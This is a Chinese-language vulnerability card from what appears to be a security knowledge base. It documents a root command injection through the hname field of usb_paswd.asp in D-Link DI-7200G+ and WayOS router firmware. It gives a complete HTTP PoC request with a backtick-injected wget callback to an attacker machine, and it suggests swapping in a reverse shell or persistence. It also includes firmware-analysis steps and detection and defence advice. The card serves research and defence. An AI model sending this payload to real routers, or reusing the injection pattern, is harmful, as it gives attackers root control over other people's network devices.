---
id: iot-dlink-wayos-usb-paswd-hname-command-injection
title: D-Link/WayOS USB 共享组件 usb_paswd.asp hname 命令注入：jhttpd 拼 echo 到 /etc/smbusers 时进 system
type: scenario
domain: iot
path: iot
technique: iot-usb-paswd-hname-system-command-injection
aliases:
- usb_paswd.asp 命令注入
- USB 共享 Samba 用户名命令注入
- jhttpd hname 注入
- D-Link DI-7200G+ 命令执行
- WayOS 微盟路由器 USB 命令注入
tags:
- iot
- router
- dlink
- wayos
- firmware
- jhttpd
- command-injection
- usb-sharing
- samba
- mips
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V335
  verified_at: '2026-11-08T18:59:07+08:00'
  notes: 已对照原文与24/24图片核对：usb_paswd.asp 的 hname/hpasswd→sprintf(echo ... >> /etc/smbusers)→system 数据流与 img15/16 一致，反引号 wget 回连 img17 一致；未发现与另两张注入/固件卡同一 sink，无需 split。未验证点：jhttpd 以 root 运行属启动链推断，原文未回显 uid；PoC 携带管理 Cookie，未授权可达性未验证。原文未声明受影响固件版本（DI_7200G+-19.12.24A1.trx 为分析镜像），affected_versions 已 --clear；PoC 未执行。dedup 为本卡自匹配，dup-scan 无本卡 pair；无 sources/文章ID/URL/长段摘录；path iot 合法。
---

## 一句话结论

D-Link DI-7200G+ 与 WayOS 微盟路由器的 USB 共享存储功能由同一个 jhttpd 组件处理，`/usb_paswd.asp` 把用户提交的 Samba 用户名 `hname`/密码 `hpasswd` 经 `sprintf` 拼成 `echo "<用户名> <密码>" >> /etc/smbusers` 后直接交给 `system()`；在 `hname` 中放入反引号命令即可在路由器上以 root 执行任意命令（原文用 `wget` 回连攻击机验证）。

## 原理

- 固件中的 `bin/jhttpd` 同时处理 Web 管理与 USB 共享配置；`usb_paswd.asp` 对应的 handler 通过 `http_get_param()` 读取 `share_enable`、`passwd`、`hname`、`hpasswd` 等参数。
- 设置 Samba 账户时，代码调用 `jhl_nv_get_def("usb_username")`/`usb_hpasswd` 取值，再用 `sprintf(cmd, "echo \"%s %s\" >> /etc/smbusers", user, pass)` 拼命令并 `system(cmd)`（IDA 中可见 `system` 交叉引用与 `echo ... >> /etc/smbusers` 字符串）。
- 用户名/密码只被当作普通字符串写入 nvram 并拼进 shell 命令，没有过滤反引号、`$()`、分号、管道等 shell 元字符；因此 `hname=hlogin\`wget http://attacker:8000\`` 会让 `/bin/sh -c` 先执行反引号内的 wget。
- jhttpd 以 root 运行，命令注入直接获得 root 权限；USB 共享组件默认开启，攻击面是管理 Web 的一个正常配置接口。

## 触发条件

- 目标为使用该 jhttpd/USB 共享组件的 D-Link（原文实证 DI-7200G+）或 WayOS 微盟路由器。
- 能访问 `/usb_paswd.asp` 配置接口；原文 PoC 携带 `Cookie: userid=root; gw_userid=root,gw_passwd=...`，属管理会话下利用；是否存在未授权可达路径需按固件核实。
- USB 共享功能启用（原文请求 `share_enable=1`）。
- 路由器可向外发起 HTTP 请求（用于回连验证）。

## 利用步骤

1. 解包固件（binwalk/unsquashfs），`grep -r "usb_paswd.asp"` 定位到 `bin/jhttpd`，确认组件与处理函数。
2. 用 Ghidra/IDA 对 `jhttpd` 交叉引用 `system`，反编译 USB 共享配置 handler，定位 `http_get_param("hname")` → `sprintf("echo \"%s %s\" >> /etc/smbusers")` → `system()` 的数据流。
3. 在攻击机启动监听：`python3 -m http.server 8000`。
4. 发送带反引号命令的请求（原文 PoC）：
   `GET /usb_paswd.asp?share_enable=1&passwd=123456&name=login&hpasswd=123456&hname=hlogin%60wget%20http%3A%2F%2F192.168.1.2%3A8000%60&acc_ip=&acc_mac=&acc_wan=0&acc_auth=0&send_email_en=0&send_email_name=0&send_email_pwd=0&device_name=&_=1663771596225`
5. 观察攻击机 http.server 收到来自路由器（如 192.168.1.1）的 `GET /`，证明命令执行；可替换为反弹 shell 或写入持久化。

## PoC

```http
GET /usb_paswd.asp?share_enable=1&passwd=123456&name=login&hpasswd=123456&hname=hlogin%60wget%20http%3A%2F%2F192.168.1.2%3A8000%60&acc_ip=&acc_mac=&acc_wan=0&acc_auth=0&send_email_en=0&send_email_name=0&send_email_pwd=0&device_name=&_=1663771596225 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/javascript, */*
Referer: http://192.168.1.1/index.htm
Cookie: userid=root; gw_userid=root,gw_passwd=0C667259F7A2069B7C55AB5D95F2FE7B
Connection: close
```

`hname=hlogin%60wget%20http%3A%2F%2F192.168.1.2%3A8000%60` 解码后为 `hlogin\`wget http://192.168.1.2:8000\``。说明：PoC 来自原文实测，未在本机复跑。

## 变体与关联

- 变体（注入点）：`hpasswd` 与 `passwd` 同样进入拼命令流程，可替换注入载荷；`$()`、分号、管道等元字符也可能生效，取决于设备的 shell。
- 变体（组件复用）：同一 USB 共享组件出现在多个路由器 OEM/型号上，可按 `usb_paswd.asp`、`/etc/smbusers`、`echo ... >> /etc/smbusers` 字符串在固件中横向搜索。
- 关联：[[iot-jhttpd-proxy-client-asp-proxy-srv-command-injection]]（同系列 jhttpd 的另一参数命令注入）、[[iot-dlink-di8100-upgrade-filter-asp-path-command-injection]]（D-Link jhttpd 命令注入）、[[code-analysis-reverse-firmware-jhttpd-cgi-table-idapython-dump]]（jhttpd 路由表审计方法）。
- 边界：USB 共享功能关闭、接口被 ACL/认证保护、或固件已过滤 shell 元字符时利用失败。

## 检测与防御

- 检测特征：`/usb_paswd.asp` 请求的 `hname`/`hpasswd`/`passwd` 含反引号、`$(`、`;`、`|` 等；jhttpd 进程派生 `wget`/`nc`/`sh` 子进程；`/etc/smbusers` 内容出现异常。
- 防御：升级厂商固件；对用户名/密码做严格字符白名单（仅字母数字下划线）；避免把用户输入拼进 shell，改用参数数组/转义；关闭不必要的 USB 共享；管理接口限制访问源并强口令。
